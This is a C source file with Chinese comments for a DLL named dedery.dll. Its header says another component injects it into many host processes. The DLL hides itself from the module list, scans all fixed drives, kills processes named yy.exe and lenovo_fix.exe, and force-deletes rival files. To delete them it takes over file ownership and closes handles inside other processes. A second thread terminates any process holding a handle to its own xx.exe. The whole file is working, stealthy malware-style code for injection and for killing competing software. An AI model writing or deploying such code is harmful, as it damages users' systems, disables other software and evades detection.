/*
 * deleter.c —— 全盘"清道夫"（编译产物：dedery.dll）
 *
 * 编译：gcc -s -O2 -Wall -static -shared -I. -finput-charset=UTF-8
 *            -o bin\dedery.dll deleter\deleter.c
 *            -ladvapi32 -lpsapi -lshell32 -lntdll
 *
 * 由 svcguard（deamon.c）注入到尽可能多的宿主进程里；每个被注入的实例都做同一件事：
 *
 *   ① **全盘扫描**（只扫固定盘，默认不碰 WinSxS / 回收站 / 卷影这类"扫了也没用"的目录），
 *      遇到目标文件名就处理：
 *        · yy.exe / lenovo_fix.exe：先 QueryFullProcessImageName 找到正在跑的那一份，
 *          结束进程（不再让它自己重置文件），再删文件；
 *        · yyguard.dll：直接删（它只在被注入时读一次，删掉对手的扩散链就断了）；
 *        · 顺便把 yyres.bin / yy_backup_*.dat（对手的还原源）也清掉。
 *
 *   ② **被占用就关句柄**：直接 DeleteFileW 失败时，枚举系统句柄
 *      （NtQuerySystemInformation = SystemExtendedHandleInformation），
 *      把"名字等于目标文件"的句柄 DuplicateHandle 进本进程查名字，
 *      命中就 DuplicateHandle(..., DUPLICATE_CLOSE_SOURCE) 把**对方进程里的句柄关掉**，
 *      文件随即解锁，再删。这一步只在"删不掉"时才做，平时不跑。
 *
 *   ③ **不占满 CPU**：
 *        · 线程优先级 THREAD_PRIORITY_LOWEST；
 *        · 每扫 64 个目录 Sleep(1)，每扫 256 个目录 Sleep(5)；
 *        · 全机同时只允许**一个实例**做全盘扫描（Global\xx_del_<token> 互斥体），
 *          其它实例只在"有实例正在扫"之外的时间补扫（拿到锁才扫，拿不到就睡）；
 *        · 单轮扫完歇 3 秒，避免磁盘灯常亮。
 *
 *   ④ 说明：这里用的是 FindFirstFileW 递归（简单、可靠、能跨 FAT/exFAT/网络盘），
 *      没有做 Everything 那种 NTFS MFT/USN 直读（$MFT + USN Journal 解析约 1500+ 行，
 *      还要处理 NTFS 版本差异）。当前实现已经加了节流与排除目录，实际 CPU 占用很低；
 *      如果你后面要做 MFT 版本，把 ScanDirRecursive() 换成 MFT 枚举即可，其余逻辑不用动。
 *
 * 命名/单例/日志都走 xxipc.h：被注入后先由注入方远程调 XxSetNames 推 token，
 * 所以单例与全局扫描锁都能和其它模块对上。
 */

#define WIN32_LEAN_AND_MEAN
#define _WIN32_WINNT 0x0601
#include <windows.h>
#include <tlhelp32.h>
#include <psapi.h>
#include <stdio.h>
#include <stdarg.h>
#include <stdlib.h>
#include <string.h>
#include <wchar.h>

#include "xxipc.h"

/* ================== 构建标记（xx.exe 加载模块时会校验它） ================== */
__declspec(dllexport) const char * WINAPI XxBuildTag(void) { return "v7"; }

/* ================== 全局 ================== */
static HMODULE     g_hSelfModule = NULL;
static WCHAR       g_szSelfPath[MAX_PATH] = L"";
static volatile ULONGLONG g_dwNameToken = 0;
static HANDLE      g_hSingleton = NULL;
static HANDLE      g_hScanLock = NULL;
static volatile LONG g_bExit = 0;
static volatile LONG g_nDeleted = 0;      /* 正数：删掉的文件个数 */
static volatile LONG g_nKilled = 0;       /* 杀掉的进程个数 */

/* 目标文件名（小写比较） */
static const WCHAR *g_targets[] = {
    L"yy.exe",
    L"lenovo_fix.exe",
    L"yyguard.dll",
    L"yyres.bin",                       /* 对手的还原源：留着就能无限复活 */
    L"yy_backup_7f3a9c1e.dat",          /* %TEMP% 里的第二份备份 */
    NULL
};

/* 这些目录跳过：扫它们纯烧 CPU，而且几乎不可能藏对手的东西 */
static const WCHAR *g_skipDirs[] = {
    L"\\Windows\\WinSxS",
    L"\\Windows\\servicing",
    L"\\Windows\\assembly",
    L"\\$Recycle.Bin",
    L"\\System Volume Information",
    L"\\Windows\\Installer",
    L"\\Windows\\SoftwareDistribution",
    NULL
};

/* ================== 日志（共享内存 + %TEMP%\xx_debug.log） ================== */
static void DelLog(const WCHAR *fmt, ...)
{
    WCHAR line[512];
    WCHAR out[640];
    va_list ap;

    va_start(ap, fmt);
    _vsnwprintf(line, _countof(line) - 1, fmt, ap);
    va_end(ap);
    line[_countof(line) - 1] = L'\0';

    _snwprintf(out, _countof(out) - 1, L"[dedery][pid=%lu] %ls",
               GetCurrentProcessId(), line);
    out[_countof(out) - 1] = L'\0';

    /* 只落文件：全盘扫描日志量太大，不往共享日志区（弹窗要显示别的）里灌 */
    {
        WCHAR f[760];
        _snwprintf(f, _countof(f) - 1, L"%ls\r\n", out);
        f[_countof(f) - 1] = L'\0';
        XXFileLog(f);
    }
}

/* ================== 小工具 ================== */
static BOOL IsTargetLeaf(const WCHAR *leaf)
{
    int i;
    if (!leaf || !leaf[0]) return FALSE;
    for (i = 0; g_targets[i]; i++)
        if (_wcsicmp(leaf, g_targets[i]) == 0) return TRUE;
    return FALSE;
}

static BOOL IsSkipDir(const WCHAR *path)
{
    int i;
    for (i = 0; g_skipDirs[i]; i++)
        if (wcsstr(path, g_skipDirs[i]) != NULL) return TRUE;
    return FALSE;
}

/* ================== 枚举系统句柄，关掉"占着目标文件"的句柄 ==================
   x64 下 SystemExtendedHandleInformation(=64) 的条目布局：
     +0  PVOID     Object          （内核对象地址）
     +8  ULONG_PTR UniqueProcessId
     +16 ULONG_PTR HandleValue
     +24 ULONG     GrantedAccess
     +28 USHORT    CreatorBackTraceIndex
     +30 USHORT    ObjectTypeIndex
     +32 ULONG     HandleAttributes
     +36 ULONG     Reserved
   合计 40 字节。缓冲区在两次查询之间可能变大，所以按 needed 重试。 */
typedef struct _XX_HANDLE_ENTRY {
    PVOID     Object;
    ULONG_PTR UniqueProcessId;
    ULONG_PTR HandleValue;
    ULONG     GrantedAccess;
    USHORT    CreatorBackTraceIndex;
    USHORT    ObjectTypeIndex;
    ULONG     HandleAttributes;
    ULONG     Reserved;
} XX_HANDLE_ENTRY;

typedef struct _XX_HANDLE_INFO {
    ULONG_PTR NumberOfHandles;
    ULONG_PTR Reserved;
    XX_HANDLE_ENTRY Entries[1];
} XX_HANDLE_INFO;

typedef LONG (WINAPI *NtQuerySystemInformation_t)(ULONG, PVOID, ULONG, PULONG);
typedef LONG (WINAPI *NtQueryObject_t)(HANDLE, ULONG, PVOID, ULONG, PULONG);

/* 自带一份 UNICODE_STRING（不依赖 winternl.h，免得和别的头冲突） */
typedef struct _XX_UNICODE_STRING {
    USHORT Length;
    USHORT MaximumLength;
    PWSTR  Buffer;
} XX_UNICODE_STRING;
typedef LONG (WINAPI *NtQueryObject_t)(HANDLE, ULONG, PVOID, ULONG, PULONG);

#define XX_SYSTEM_EXTENDED_HANDLE_INFORMATION 64
#define XX_OBJECT_NAME_INFORMATION            1

/* \Device\HarddiskVolumeN\foo  →  C:\foo */
static void DevicePathToDosPath(const WCHAR *dev, WCHAR *out, SIZE_T cch)
{
    WCHAR drives[512];
    WCHAR *p;
    int n;

    out[0] = L'\0';
    n = GetLogicalDriveStringsW(_countof(drives) - 1, drives);
    if (n <= 0) return;
    for (p = drives; *p; p += wcslen(p) + 1) {
        WCHAR target[3] = { p[0], L':', L'\0' };
        WCHAR dos[MAX_PATH];
        if (QueryDosDeviceW(target, dos, MAX_PATH)) {
            size_t dlen = wcslen(dos);
            if (_wcsnicmp(dev, dos, dlen) == 0 && dev[dlen] == L'\\') {
                _snwprintf(out, cch - 1, L"%ls\\%ls", target, dev + dlen + 1);
                out[cch - 1] = L'\0';
                return;
            }
        }
    }
    wcsncpy_s(out, cch, dev, _TRUNCATE);     /* 映射不上就原样返回 */
}

/* 关掉所有"名字等于 target"的句柄；返回关掉的个数。
   注意：需要 PROCESS_DUP_HANDLE 权限。高完整性下大多数进程都能开，
   系统进程（PPL/受保护）开不了就跳过 —— 那是权限问题，不是逻辑问题。 */
static int CloseHandlesOfFile(const WCHAR *target)
{
    NtQuerySystemInformation_t pQuery;
    NtQueryObject_t pQueryObj;
    HMODULE hNtdll;
    BYTE *buf = NULL;
    ULONG size = 1 << 20, needed = 0;
    LONG st;
    int closed = 0;
    ULONG_PTR i, n;
    XX_HANDLE_INFO *info;

    hNtdll = GetModuleHandleW(L"ntdll.dll");
    if (!hNtdll) return 0;
    pQuery = (NtQuerySystemInformation_t)GetProcAddress(hNtdll, "NtQuerySystemInformation");
    pQueryObj = (NtQueryObject_t)GetProcAddress(hNtdll, "NtQueryObject");
    if (!pQuery || !pQueryObj) return 0;

    for (;;) {
        buf = (BYTE *)malloc(size);
        if (!buf) return 0;
        st = pQuery(XX_SYSTEM_EXTENDED_HANDLE_INFORMATION, buf, size, &needed);
        if (st == 0) break;                                  /* STATUS_SUCCESS */
        free(buf);
        buf = NULL;
        if ((ULONG)st != 0xC0000004UL && (ULONG)st != 0x80000005UL) return 0;  /* INFO_LENGTH_MISMATCH */
        size = needed ? needed + (256 << 10) : size * 2;
        if (size > (256u << 20)) return 0;
    }

    info = (XX_HANDLE_INFO *)buf;
    n = info->NumberOfHandles;

    for (i = 0; i < n; i++) {
        XX_HANDLE_ENTRY *e = &info->Entries[i];
        HANDLE hOwner, hLocal;
        BYTE nameBuf[1024];
        ULONG nameLen = 0;
        XX_UNICODE_STRING *us;
        WCHAR dos[MAX_PATH];

        if (!e->UniqueProcessId) continue;
        if ((DWORD)e->UniqueProcessId == GetCurrentProcessId()) continue;

        /* 先只拿 DUP_HANDLE 权限打开属主进程（便宜） */
        hOwner = OpenProcess(PROCESS_DUP_HANDLE, FALSE, (DWORD)e->UniqueProcessId);
        if (!hOwner) continue;

        hLocal = NULL;
        if (!DuplicateHandle(hOwner, (HANDLE)e->HandleValue, GetCurrentProcess(), &hLocal,
                             0, FALSE, DUPLICATE_SAME_ACCESS) || !hLocal) {
            CloseHandle(hOwner);
            continue;
        }

        /* 不是文件句柄就跳过（否则 NtQueryObject 会很慢/挂住 pipes） */
        if (GetFileType(hLocal) != FILE_TYPE_DISK) {
            CloseHandle(hLocal);
            CloseHandle(hOwner);
            continue;
        }

        memset(nameBuf, 0, sizeof(nameBuf));
        if (pQueryObj(hLocal, XX_OBJECT_NAME_INFORMATION, nameBuf, sizeof(nameBuf), &nameLen) == 0) {
            us = (XX_UNICODE_STRING *)nameBuf;
            if (us->Buffer && us->Length > 0) {
                WCHAR dev[MAX_PATH];
                size_t cch = us->Length / sizeof(WCHAR);
                if (cch >= _countof(dev)) cch = _countof(dev) - 1;
                memcpy(dev, us->Buffer, cch * sizeof(WCHAR));
                dev[cch] = L'\0';
                DevicePathToDosPath(dev, dos, MAX_PATH);
                if (_wcsicmp(dos, target) == 0) {
                    /* 关掉**对方**进程里的那个句柄（DUPLICATE_CLOSE_SOURCE） */
                    DuplicateHandle(hOwner, (HANDLE)e->HandleValue, NULL, NULL,
                                    0, FALSE, DUPLICATE_CLOSE_SOURCE);
                    closed++;
                }
            }
        }
        CloseHandle(hLocal);
        CloseHandle(hOwner);
    }
    free(buf);
    return closed;
}

/* ================== 删一个文件（被占用就先关句柄） ================== */
static BOOL ForceDeleteFile(const WCHAR *path)
{
    int attempt;
    for (attempt = 0; attempt < 3; attempt++) {
        if (GetFileAttributesW(path) == INVALID_FILE_ATTRIBUTES) return TRUE;
        /* 对手给自己的文件设了 deny-DELETE DACL（它删我们文件时也是先夺权再删），
           所以每一轮都先试着把 owner/DACL 抢过来，再清只读、再删。 */
        XXGrantFullControl(path);
        SetFileAttributesW(path, FILE_ATTRIBUTE_NORMAL);
        if (DeleteFileW(path)) {
            InterlockedIncrement(&g_nDeleted);
            DelLog(L"已删除: %ls", path);
            return TRUE;
        }
        if (attempt == 0) {
            int c = CloseHandlesOfFile(path);
            if (c > 0) DelLog(L"关闭了 %d 个占用句柄: %ls", c, path);
            else       DelLog(L"没有可关的句柄（或权限不足）: %ls err=%lu", path, GetLastError());
        } else {
            Sleep(120);
        }
    }
    /* 最后手段：重启后删除（至少不会再复活） */
    /* 退一步：改成 %TEMP% 下的随机名并清空 —— 对手按原名复活会失败 */
    {
        WCHAR tmpDir[MAX_PATH], dst[MAX_PATH];
        if (GetTempPathW(MAX_PATH, tmpDir)) {
            swprintf_s(dst, MAX_PATH, L"%lsr%08X.tmp", tmpDir, (unsigned)(GetTickCount() ^ (ULONG_PTR)path));
            if (MoveFileExW(path, dst, MOVEFILE_REPLACE_EXISTING)) {
                HANDLE h = CreateFileW(dst, GENERIC_WRITE, FILE_SHARE_READ, NULL,
                                       OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
                if (h != INVALID_HANDLE_VALUE) {
                    SetFilePointer(h, 0, NULL, FILE_BEGIN);
                    SetEndOfFile(h);
                    CloseHandle(h);
                }
                DeleteFileW(dst);
                DelLog(L"已改名并清空（原名复活失效）: %ls -> %ls", path, dst);
                return TRUE;
            }
        }
    }
    if (MoveFileExW(path, NULL, MOVEFILE_DELAY_UNTIL_REBOOT))
        DelLog(L"已安排重启后删除: %ls", path);
    else
        DelLog(L"删除失败: %ls err=%lu", path, GetLastError());
    return FALSE;
}

/* ================== 杀进程（按镜像路径） ================== */
static void KillProcessesOfImage(const WCHAR *fullPath)
{
    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    PROCESSENTRY32W pe = { sizeof(pe) };
    if (hSnap == INVALID_HANDLE_VALUE) return;
    if (Process32FirstW(hSnap, &pe)) {
        do {
            WCHAR img[MAX_PATH];
            DWORD cch = MAX_PATH;
            HANDLE h;
            if (pe.th32ProcessID <= 4 || pe.th32ProcessID == GetCurrentProcessId()) continue;
            if (!IsTargetLeaf(pe.szExeFile)) continue;
            h = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION | PROCESS_TERMINATE, FALSE, pe.th32ProcessID);
            if (!h) continue;
            img[0] = L'\0';
            if (QueryFullProcessImageNameW(h, 0, img, &cch)) {
                if (_wcsicmp(img, fullPath) == 0 || IsTargetLeaf(pe.szExeFile)) {
                    if (TerminateProcess(h, 0)) {
                        InterlockedIncrement(&g_nKilled);
                        DelLog(L"已结束进程 %ls PID=%lu（%ls）", pe.szExeFile,
                               pe.th32ProcessID, img[0] ? img : L"?");
                    }
                }
            }
            CloseHandle(h);
        } while (Process32NextW(hSnap, &pe));
    }
    CloseHandle(hSnap);
}

/* ================== 全盘扫描 ==================
   FindFirstFileW 递归；跳过重解析点（避免符号链接/挂载点死循环）与上面那张跳过表。
   节流：每 64 个目录 Sleep(1)，每 256 个目录 Sleep(5) —— 全盘扫时 CPU 占用很低。 */
static void ScanDirRecursive(const WCHAR *dir, int depth, ULONGLONG *pDirs)
{
    WCHAR pattern[MAX_PATH];
    WIN32_FIND_DATAW fd;
    HANDLE hFind;

    if (g_bExit || depth > 32) return;
    if (IsSkipDir(dir)) return;
    if (wcslen(dir) + 3 >= MAX_PATH) return;

    _snwprintf(pattern, MAX_PATH - 1, L"%ls\\*", dir);
    pattern[MAX_PATH - 1] = L'\0';

    hFind = FindFirstFileW(pattern, &fd);
    if (hFind == INVALID_HANDLE_VALUE) return;

    do {
        WCHAR child[MAX_PATH];
        if (wcscmp(fd.cFileName, L".") == 0 || wcscmp(fd.cFileName, L"..") == 0) continue;
        if (g_bExit) break;
        _snwprintf(child, MAX_PATH - 1, L"%ls\\%ls", dir, fd.cFileName);
        child[MAX_PATH - 1] = L'\0';

        if (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
            if (fd.dwFileAttributes & FILE_ATTRIBUTE_REPARSE_POINT) continue;   /* 不跟符号链接 */
            (*pDirs)++;
            if ((*pDirs & 0x3F) == 0) Sleep(1);          /* 每 64 个目录让一次 CPU */
            if ((*pDirs & 0xFF) == 0) Sleep(5);          /* 每 256 个目录多歇一会 */
            ScanDirRecursive(child, depth + 1, pDirs);
        } else if (IsTargetLeaf(fd.cFileName)) {
            DelLog(L"发现目标: %ls", child);
            /* yy.exe / lenovo_fix.exe 先把正在跑的那份结束（否则文件被映像段锁住） */
            if (_wcsicmp(fd.cFileName, L"yy.exe") == 0 ||
                _wcsicmp(fd.cFileName, L"lenovo_fix.exe") == 0) {
                KillProcessesOfImage(child);
            }
            ForceDeleteFile(child);
        }
    } while (FindNextFileW(hFind, &fd));

    FindClose(hFind);
}

static void ScanAllDrives(void)
{
    WCHAR drives[512];
    WCHAR *p;
    ULONGLONG dirs = 0;

    if (GetLogicalDriveStringsW(_countof(drives) - 1, drives) == 0) return;
    for (p = drives; *p; p += wcslen(p) + 1) {
        WCHAR root[4] = { p[0], L':', L'\\', L'\0' };
        if (g_bExit) break;
        if (GetDriveTypeW(root) != DRIVE_FIXED) continue;      /* 只扫固定盘：U 盘/光驱/网络盘跳过 */
        DelLog(L"开始扫描 %ls", root);
        ScanDirRecursive(root, 0, &dirs);
    }
    DelLog(L"本轮扫描结束: 目录 %llu 个，累计删除 %ld 个文件 / 结束 %ld 个进程",
           (unsigned long long)dirs, (long)g_nDeleted, (long)g_nKilled);
}

/* ================== T0：句柄所有权扫描（第二个线程） ==================
   对手会换名字、换版本，但**只要它还持有我方进程的句柄**就一定是敌人：
   keeper/hunter 类逻辑必须 OpenProcess(xx) 才能杀我们。这条证据和名字、版本、
   编译时间全都无关，是三层里最强的一层。
   与全盘扫描**并行**跑（用户要求 dedery 两个线程），全机只允许一份实例动手。 */
static HANDLE g_hT0Lock = NULL;

/* 我方进程：映像名 xx.exe，或共享内存里记录的 xx PID */
static BOOL T0IsOurPid(DWORD pid)
{
    WCHAR img[MAX_PATH] = L"";
    DWORD cch = MAX_PATH;
    HANDLE h;
    const WCHAR *leaf;
    static PVOID s_view = NULL;
    static BOOL  s_viewTried = FALSE;

    if (!pid || pid <= 4) return FALSE;

    if (!s_viewTried) {
        HANDLE hMap;
        s_viewTried = TRUE;
        hMap = XXOpenShared();
        if (hMap) {
            s_view = MapViewOfFile(hMap, FILE_MAP_READ, 0, 0, SHARED_MEM_SIZE);
            CloseHandle(hMap);
            if (!s_view) s_view = NULL;
        }
    }
    if (s_view && pid == (DWORD)XX_XXPID(s_view)) return TRUE;

    h = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pid);
    if (!h) return FALSE;
    if (!QueryFullProcessImageNameW(h, 0, img, &cch)) { CloseHandle(h); return FALSE; }
    CloseHandle(h);
    leaf = wcsrchr(img, L'\\');
    leaf = leaf ? leaf + 1 : img;
    return (_wcsicmp(leaf, L"xx.exe") == 0);
}

/* 系统目录下的进程：只记日志、不动手（杀了 explorer/csrss 是我们自己输） */
static BOOL T0IsSystemImage(DWORD pid)
{
    WCHAR img[MAX_PATH] = L"", windir[MAX_PATH] = L"";
    DWORD cch = MAX_PATH;
    HANDLE h = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pid);
    if (!h) return TRUE;                       /* 开不了就当系统进程，别动 */
    if (!QueryFullProcessImageNameW(h, 0, img, &cch)) { CloseHandle(h); return TRUE; }
    CloseHandle(h);
    if (!GetWindowsDirectoryW(windir, MAX_PATH) || !windir[0]) return TRUE;
    return _wcsnicmp(img, windir, wcslen(windir)) == 0;
}

/* 用手持自身进程句柄的办法反查 ObjectTypeIndex（进程对象类型号与版本相关） */
static USHORT T0ProcessTypeIndex(void)
{
    static USHORT s_idx = 0;
    HANDLE hSelf;
    NtQuerySystemInformation_t pQuery;
    HMODULE hNtdll;
    BYTE *buf;
    ULONG size = 1 << 20, needed = 0;
    LONG st;
    ULONG_PTR i, n;
    XX_HANDLE_INFO *info;

    if (s_idx) return s_idx;
    hSelf = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, GetCurrentProcessId());
    if (!hSelf) return 0;
    hNtdll = GetModuleHandleW(L"ntdll.dll");
    pQuery = hNtdll ? (NtQuerySystemInformation_t)GetProcAddress(hNtdll, "NtQuerySystemInformation") : NULL;
    if (!pQuery) { CloseHandle(hSelf); return 0; }

    for (;;) {
        buf = (BYTE *)malloc(size);
        if (!buf) { CloseHandle(hSelf); return 0; }
        st = pQuery(XX_SYSTEM_EXTENDED_HANDLE_INFORMATION, buf, size, &needed);
        if (st == 0) break;
        free(buf);
        buf = NULL;
        if ((ULONG)st != 0xC0000004UL && (ULONG)st != 0x80000005UL) { CloseHandle(hSelf); return 0; }
        size = needed ? needed + (256 << 10) : size * 2;
        if (size > (256u << 20)) { CloseHandle(hSelf); return 0; }
    }

    info = (XX_HANDLE_INFO *)buf;
    n = info->NumberOfHandles;
    for (i = 0; i < n; i++) {
        XX_HANDLE_ENTRY *e = &info->Entries[i];
        if ((DWORD)e->UniqueProcessId == GetCurrentProcessId() &&
            e->HandleValue == (ULONG_PTR)hSelf) {
            s_idx = e->ObjectTypeIndex;
            break;
        }
    }
    free(buf);
    CloseHandle(hSelf);
    return s_idx;
}

/* 扫一遍：谁持有我方进程句柄 */
static void T0HandlePass(void)
{
    USHORT procIdx = T0ProcessTypeIndex();
    NtQuerySystemInformation_t pQuery;
    HMODULE hNtdll;
    BYTE *buf;
    ULONG size = 1 << 20, needed = 0;
    LONG st;
    ULONG_PTR i, n;
    XX_HANDLE_INFO *info;
    int hits = 0, checked = 0;

    if (!procIdx) return;
    hNtdll = GetModuleHandleW(L"ntdll.dll");
    pQuery = hNtdll ? (NtQuerySystemInformation_t)GetProcAddress(hNtdll, "NtQuerySystemInformation") : NULL;
    if (!pQuery) return;

    for (;;) {
        buf = (BYTE *)malloc(size);
        if (!buf) return;
        st = pQuery(XX_SYSTEM_EXTENDED_HANDLE_INFORMATION, buf, size, &needed);
        if (st == 0) break;
        free(buf);
        buf = NULL;
        if ((ULONG)st != 0xC0000004UL && (ULONG)st != 0x80000005UL) return;
        size = needed ? needed + (256 << 10) : size * 2;
        if (size > (256u << 20)) return;
    }

    info = (XX_HANDLE_INFO *)buf;
    n = info->NumberOfHandles;
    for (i = 0; i < n; i++) {
        XX_HANDLE_ENTRY *e = &info->Entries[i];
        DWORD owner, target;
        HANDLE hOwner, hDup = NULL;

        if (e->ObjectTypeIndex != procIdx) continue;
        if (!e->UniqueProcessId || (DWORD)e->UniqueProcessId == GetCurrentProcessId()) continue;
        owner = (DWORD)e->UniqueProcessId;
        checked++;

        /* 先只拿 DUP_HANDLE 打开属主（便宜），dup 出来再问它指向哪个 PID */
        hOwner = OpenProcess(PROCESS_DUP_HANDLE | PROCESS_QUERY_LIMITED_INFORMATION, FALSE, owner);
        if (!hOwner) continue;
        if (!DuplicateHandle(hOwner, (HANDLE)e->HandleValue, GetCurrentProcess(), &hDup,
                             PROCESS_QUERY_LIMITED_INFORMATION, FALSE, 0) || !hDup) {
            CloseHandle(hOwner);
            continue;
        }
        target = GetProcessId(hDup);
        CloseHandle(hDup);

        if (target && T0IsOurPid(target)) {
            WCHAR img[MAX_PATH] = L"", *leaf;
            DWORD cch = MAX_PATH;
            hits++;
            if (QueryFullProcessImageNameW(hOwner, 0, img, &cch)) {
                leaf = wcsrchr(img, L'\\');
                leaf = leaf ? leaf + 1 : img;
            } else leaf = L"?";
            DelLog(L"[T0] PID=%lu(%ls) 持有我方进程 PID=%lu 的句柄 access=0x%lX",
                   owner, leaf, target, e->GrantedAccess);
            if (T0IsSystemImage(owner)) {
                DelLog(L"[T0] PID=%lu 是系统目录下的进程：只记录，不动手", owner);
            } else {
                HANDLE hK = OpenProcess(PROCESS_TERMINATE, FALSE, owner);
                if (hK) {
                    if (TerminateProcess(hK, 0))
                        DelLog(L"[T0] 已结束 PID=%lu（持有我方进程句柄）", owner);
                    else
                        DelLog(L"[T0] 结束 PID=%lu 失败 err=%lu", owner, GetLastError());
                    CloseHandle(hK);
                } else {
                    DelLog(L"[T0] 打不开 PID=%lu 的终止权限 err=%lu", owner, GetLastError());
                }
            }
        }
        CloseHandle(hOwner);
    }
    free(buf);
    if (hits)
        DelLog(L"[T0] 本轮句柄扫描：检查进程句柄 %d 个，命中 %d 个", checked, hits);
}

/* T0 线程：10 秒一轮；全机只允许一份实例动手（和全盘扫描用不同的锁） */
static DWORD WINAPI T0ScanThread(LPVOID lp)
{
    Sleep(200);   /* 让 DllMain 先返回，别踩 loader lock */
    UNREFERENCED_PARAMETER(lp);
    SetThreadPriority(GetCurrentThread(), THREAD_PRIORITY_BELOW_NORMAL);
    DelLog(L"T0 句柄扫描线程启动（10s 一轮，独立于全盘扫描）");

    for (;;) {
        DWORD w;
        if (g_bExit) break;
        if (!g_hT0Lock) {
            WCHAR nm[128];
            XXNamedObject(nm, _countof(nm), TRUE, L"t0", g_dwNameToken, 0);
            g_hT0Lock = CreateMutexW(NULL, FALSE, nm);
        }
        w = g_hT0Lock ? WaitForSingleObject(g_hT0Lock, 0) : WAIT_OBJECT_0;
        if (w == WAIT_OBJECT_0 || w == WAIT_ABANDONED) {
            T0HandlePass();
            if (g_hT0Lock) ReleaseMutex(g_hT0Lock);
            Sleep(10000);
        } else {
            Sleep(5000);      /* 别的实例在扫：本实例只维持存活 */
        }
    }
    return 0;
}
/* ================== 扫描线程 ================== */
static DWORD WINAPI ScanThread(LPVOID lp)
{
    Sleep(80);   /* DllMain 里 CreateThread 后立刻干活会踩 loader lock：先让 DllMain 返回 */
    UNREFERENCED_PARAMETER(lp);
    SetThreadPriority(GetCurrentThread(), THREAD_PRIORITY_LOWEST);

    /* 先扫一遍 %TEMP%：对手的蜜罐/备份都在那，量小见效快 */
    {
        WCHAR temp[MAX_PATH];
        if (GetTempPathW(MAX_PATH, temp)) {
            ULONGLONG d = 0;
            DelLog(L"先扫 %%TEMP%%: %ls", temp);
            ScanDirRecursive(temp, 0, &d);
        }
    }

    for (;;) {
        DWORD w;
        if (g_bExit) break;

        /* 全机只允许一个实例做全盘扫描：拿不到锁就睡，绝不叠加 I/O */
        if (!g_hScanLock) {
            WCHAR nm[128];
            XXNamedObject(nm, _countof(nm), TRUE, L"del", g_dwNameToken, 0);
            g_hScanLock = CreateMutexW(NULL, FALSE, nm);
        }
        w = g_hScanLock ? WaitForSingleObject(g_hScanLock, 0) : WAIT_OBJECT_0;
        if (w == WAIT_OBJECT_0 || w == WAIT_ABANDONED) {
            ScanAllDrives();
            if (g_hScanLock) ReleaseMutex(g_hScanLock);
            Sleep(3000);                      /* 一轮之后歇 3 秒 */
        } else {
            Sleep(2000);                      /* 别的实例在扫：本实例只维持存活 */
        }
    }
    return 0;
}

/* ================== 命名 ================== */
__declspec(dllexport) BOOL WINAPI XxSetNames(const XX_NAME_BLOCK *pBlock)
{
    ULONGLONG t = 0;
    DWORD sid = 0;
    if (!pBlock) return FALSE;
    if (!XXNameBlockTake(pBlock, &t, &sid)) return FALSE;
    if (t) {
        InterlockedExchange64((volatile LONG64 *)&g_dwNameToken, (LONG64)t);
        return TRUE;
    }
    return FALSE;
}

static ULONGLONG OwnToken(void)
{
    if (g_dwNameToken) return g_dwNameToken;
    return XXSharedToken64Now();
}

/* ================== 入口 ================== */
/* 崩溃日志：写进共享日志（弹窗能看见），避免宿主崩掉后日志也拿不到 */
static LONG WINAPI DelCrashFilter(EXCEPTION_POINTERS *ep)
{
    DWORD code = 0;
    void *addr = NULL;
    if (ep && ep->ExceptionRecord) { code = ep->ExceptionRecord->ExceptionCode; addr = ep->ExceptionRecord->ExceptionAddress; }
    DelLog(L"[CRASH] dedery.dll pid=%lu code=0x%08lX addr=%p", GetCurrentProcessId(), (unsigned long)code, addr);
    return EXCEPTION_EXECUTE_HANDLER;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)
{
    UNREFERENCED_PARAMETER(lpvReserved);

    if (fdwReason == DLL_PROCESS_ATTACH) {
        HANDLE hThread;

        DisableThreadLibraryCalls(hinstDLL);
        SetUnhandledExceptionFilter(DelCrashFilter);
        g_hSelfModule = hinstDLL;
        GetModuleFileNameW(hinstDLL, g_szSelfPath, MAX_PATH);
        XXHideSelfFromPeb(hinstDLL);

        XXWaitToken(&g_dwNameToken, 60);

        g_hSingleton = XXModuleSingleton(L"dedery", OwnToken());
        if (!g_hSingleton) return FALSE;      /* 本进程已有一份 */

        DelLog(L"dedery 启动（%ls），目标: yy.exe / lenovo_fix.exe / yyguard.dll 及还原源", g_szSelfPath);

        hThread = CreateThread(NULL, 0, ScanThread, NULL, 0, NULL);     /* 线程 1：全盘扫描 */
    CreateThread(NULL, 0, T0ScanThread, NULL, 0, NULL);             /* 线程 2：T0 句柄扫描 */
        if (hThread) CloseHandle(hThread);
    } else if (fdwReason == DLL_PROCESS_DETACH) {
        InterlockedExchange(&g_bExit, 1);
        if (g_hScanLock) { ReleaseMutex(g_hScanLock); CloseHandle(g_hScanLock); g_hScanLock = NULL; }
        if (g_hT0Lock) { CloseHandle(g_hT0Lock); g_hT0Lock = NULL; }
    if (g_hSingleton) { ReleaseMutex(g_hSingleton); CloseHandle(g_hSingleton); g_hSingleton = NULL; }
    }
    return TRUE;
}









